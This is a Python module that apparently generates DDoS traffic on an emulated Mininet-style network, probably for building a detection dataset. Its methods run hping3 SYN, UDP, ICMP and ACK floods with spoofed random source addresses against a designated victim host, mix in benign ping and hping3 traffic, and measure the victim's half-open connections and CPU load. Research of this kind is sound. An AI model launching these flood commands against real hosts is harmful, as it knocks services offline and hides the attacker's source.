from scapy.all import *
from scapy.layers.inet import *
from config.config import Config
from log.log import LoggerConfig
import time
import threading
import subprocess

class Generator:
    def __init__(self, net):
        # net.start()
    
        self.h1 = net.get('h1')
        self.h2 = net.get('h2')
        self.h3 = net.get('h3')
        self.h4 = net.get('h4')
        self.h5 = net.get('h5')
        self.h6 = net.get('h6')
        self.h7 = net.get('h7')
        self.h8 = net.get('h8')
        self.h9 = net.get('h9')

        self.users = [self.h2, self.h3, self.h4, self.h6, self.h7, self.h8]
        self.attackers = [self.h1, self.h9]
        self.victim = [self.h5]

        self.config = Config()

        self.lock = threading.Lock()
        self.logger = LoggerConfig.get_logger(__name__)

    def normal(self):
        duration = self.config.get_setting('duration')
        rate = self.config.get_setting('rate')
        rate1 = 1/rate
        rate2 = 1000000/rate
        self.victim[0].cmd('cd resources')
        self.victim[0].cmd('python3 -m http.server 80 &')
        # self.victim[0].cmd('iperf -s -p 5050 &')
        # self.victim[0].cmd('iperf -s -u -p 5051 &')
        time.sleep(1)
        for src in self.users:
            src_ip = src.IP()
            dst_ip = self.victim[0].IP()
            
            src.cmd('cd downloads')
            src.cmd("ping {} -c 10000 -i {} &".format(dst_ip, rate1))
            # src.cmd("iperf -p 5050 -c {} &".format(dst_ip)) 
            src.cmd("hping3 -S -c 10000 -i u{} -e 'NormalTCPTraffic' -p 5050 {} &".format(rate2, dst_ip))
            src.cmd("hping3 -2 -c 10000 -i u{} -e 'NormalUDPTraffic' -p 5051 {} &".format(rate2, dst_ip))
            
            # src.cmd("wget http://{}/index.html &".format(dst_ip))
            # src.cmd("killall -9 wget")
            # src.cmd("rm -rf /home/zzy/DDoS/downloads/*")

    def attack(self, level='default'):
        rate = self.config.get_setting('rate', level=level)
        rate = 1000000/rate
        dst_ip = self.victim[0].IP()
        for attacker in self.attackers:
            attacker.cmd("hping3 -c 10000 -S -V -d 120 -w 64 -p 80 --rand-source -i u{} -e 'SYNFloodAttack' {} &".format(rate, dst_ip))
            attacker.cmd("hping3 -c 10000 -2 -V -d 120 -w 64 --rand-source -i u{} -e 'UDPFloodAttack' {} &".format(rate, dst_ip))
            # attacker.cmd("hping3 -c 10000 -1 -V -d 120 -w 64 --rand-source -i u{} -e 'ICMPFloodAttack' {} &".format(rate, dst_ip))
            attacker.cmd("hping3 -c 10000 -A -V -d 120 -w 64 --rand-source -i u{} -e 'ACKFloodAttack' {} &".format(rate, dst_ip))


    def syn_flood(self, level='default'):
        duration = self.config.get_setting('duration', level=level)
        rate = self.config.get_setting('rate', level=level)
        rate = 1000000/rate
        dst_ip = self.victim[0].IP()
        for attacker in self.attackers:
            attacker.cmd("hping3 -c 10000 -S -V -d 120 -w 64 -p 80 --rand-source -i {} -e 'SYNFloodAttack' {} &".format(rate, dst_ip))
        # self.victim[0].cmd("tcpdump -i h5-eth0 -c 1000 -w ./packets.pcap")

    def udp_flood(self, level='default'):
        duration = self.config.get_setting('duration', level=level)
        rate = self.config.get_setting('rate', level=level)
        rate = 1000000/rate
        dst_ip = self.victim[0].IP()
        for attacker in self.attackers:
            attacker.cmd("hping3 -c 10000 -2 -V -d 120 -w 64 --rand-source -i {} -e 'UDPFloodAttack' {} &".format(rate, dst_ip))

    def icmp_flood(self, level='default'):
        duration = self.config.get_setting('duration', level=level)
        rate = self.config.get_setting('rate', level=level)
        rate = 1000000/rate
        dst_ip = self.victim[0].IP()
        for attacker in self.attackers:
            attacker.cmd("hping3 -c 10000 -1 -V -d 120 -w 64 --rand-source -i {} -e 'ICMPFloodAttack' {} &".format(rate, dst_ip))

    def ack_flood(self, level='default'):
        duration = self.config.get_setting('duration', level=level)
        rate = self.config.get_setting('rate', level=level)
        rate = 1000000/rate
        dst_ip = self.victim[0].IP()
        for attacker in self.attackers:
            attacker.cmd("hping3 -c 10000 -A -V -d 120 -w 64 --rand-source -i {} -e 'ACKFloodAttack' {} &".format(rate, dst_ip))

    def check_results(self):
        victim = self.victim[0]
        # 检查目标主机的半开连接数量
        result = victim.cmd("netstat -an | grep SYN_RECV | wc -l")
        print("Number of SYN_RECV connections: {}".format(result.strip()))

        # 检查目标主机的 CPU 使用情况
        result = victim.cmd("top -b -n 1 | grep 'Cpu(s)'")
        print("CPU usage: {}".format(result.strip()))
